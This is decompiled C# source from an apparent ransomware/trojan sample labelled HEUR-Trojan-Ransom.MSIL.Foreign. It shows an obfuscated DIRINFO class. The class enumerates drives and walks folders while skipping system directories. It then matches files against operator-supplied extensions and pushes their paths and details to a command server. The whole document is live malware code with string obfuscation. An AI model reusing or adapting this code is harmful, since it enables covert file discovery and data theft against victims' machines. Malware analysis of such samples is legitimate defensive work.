// Decompiled with JetBrains decompiler
// Type: thnaviwa.DIRINFO
// Assembly: thnaviwa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 66A6D437-741C-49E8-8392-5835C756DC2C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-98894973a86aa01c4f7496ae339dc73b5e6da2f1dbcd5fe1215f70ea7b889b85.exe

using System;
using System.Collections.Generic;
using System.IO;

namespace thnaviwa
{
  internal class DIRINFO
  {
    public string thnaviwafilesLogs = CONFIG.thnaviwafilesLogs;
    public int thnaviwafIndx = 0;
    public bool thnaviwareaging = false;
    public MACDM iserver;
    public List<string> thnaviwafExts = new List<string>();
    public List<string> thnaviwanotFilders = new List<string>();
    public string thnaviwamainPath;
    public List<string> thnaviwasFiles = new List<string>();
    public int thnaviwasIndx = 0;

    public string thnaviwalookupDrives()
    {
      string str = "";
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.IsReady)
          str = str + drive.Name + ">|thnaviwa".Split('|')[0];
      }
      return str;
    }

    public IEnumerable<string> thnaviwaaddFiles(string path)
    {
      Queue<string> moreFiles = new Queue<string>();
      moreFiles.Enqueue(path);
      while (moreFiles.Count > 0 && !this.iserver.thnaviwaautCnls)
      {
        path = moreFiles.Dequeue();
        try
        {
          foreach (string directory in Directory.GetDirectories(path))
          {
            if (this.thnaviwaseeAccess(directory) && !this.thnaviwanotFilders.Contains(directory.ToLower()))
              moreFiles.Enqueue(directory);
          }
        }
        catch
        {
        }
        string[] files = Directory.GetFiles(path);
        if (files != null)
        {
          for (int i = 0; i < files.Length; ++i)
            yield return files[i];
        }
      }
    }

    public bool thnaviwaseeAccess(string fPath)
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
      try
      {
        directoryInfo.GetDirectories();
        return true;
      }
      catch (Exception ex)
      {
        return false;
      }
    }

    public DIRINFO()
    {
      this.thnaviwanotFilders.Add("clients_data|thnaviwa".Split('|')[0]);
      this.thnaviwanotFilders.Add("program files|thnaviwa".Split('|')[0]);
      this.thnaviwanotFilders.Add("system volume information|thnaviwa".Split('|')[0]);
      this.thnaviwanotFilders.Add("$recycle.bin|thnaviwa".Split('|')[0]);
      this.thnaviwanotFilders.Add("msocache|thnaviwa".Split('|')[0]);
      this.thnaviwanotFilders.Add("recoveDSDF|thnaviwa".Split('|')[0]);
      this.thnaviwanotFilders.Add("documents and settings|thnaviwa".Split('|')[0]);
      this.thnaviwanotFilders.Add("windows|thnaviwa".Split('|')[0]);
      this.thnaviwanotFilders.Add("program files (x86)|thnaviwa".Split('|')[0]);
      this.thnaviwanotFilders.Add("programdata|thnaviwa".Split('|')[0]);
    }

    public string thnaviwacheckFolders(string path)
    {
      string str = "";
      if (Directory.Exists(path))
      {
        foreach (string directory in Directory.GetDirectories(path))
        {
          if (this.thnaviwaseeAccess(directory))
            str = str + directory + ">|thnaviwa".Split('|')[0];
        }
      }
      return str;
    }

    public void thnaviwasendSearch(string path)
    {
      try
      {
        foreach (string thnaviwaaddFile in this.thnaviwaaddFiles(path))
        {
          int startIndex = thnaviwaaddFile.LastIndexOf(".");
          if (startIndex < 0)
            startIndex = 0;
          if (this.thnaviwafExts.Contains(thnaviwaaddFile.Substring(startIndex).ToLower()))
          {
            string str = this.iserver.thnaviwafile_info(thnaviwaaddFile, true);
            this.iserver.thnaviwapush_data((byte[]) null, "thnaviwa-searf=|thnaviwa".Split('|')[0] + thnaviwaaddFile + "<FILE_AUTO<|thnaviwa".Split('|')[0] + str);
          }
          if (this.iserver.thnaviwaautCnls)
            break;
        }
      }
      catch
      {
      }
    }

    public void thnaviwalookFiles(string tempStr)
    {
      this.iserver.thnaviwaautCnls = false;
      this.thnaviwafExts.Clear();
      this.thnaviwasFiles.Clear();
      this.thnaviwafIndx = 0;
      this.thnaviwasIndx = 0;
      string[] strArray = tempStr.Split('<');
      if (strArray.Length <= 1)
        return;
      string str1 = strArray[0];
      char[] chArray = new char[1]{ '>' };
      foreach (string str2 in str1.Split(chArray))
      {
        if (str2 != "")
          this.thnaviwafExts.Add(str2);
      }
      if (strArray[1] != "")
      {
        this.thnaviwareaging = true;
        this.thnaviwasendSearch(strArray[1]);
        this.thnaviwareaging = false;
        this.iserver.thnaviwapush_data((byte[]) null, "thnaviwa-seard=searched|thnaviwa".Split('|')[0]);
      }
    }

    public string thnaviwalookupFiles(string path)
    {
      string str = "";
      if (Directory.Exists(path))
      {
        foreach (string file in Directory.GetFiles(path))
          str = str + file + ">|thnaviwa".Split('|')[0];
      }
      return str;
    }
  }
}
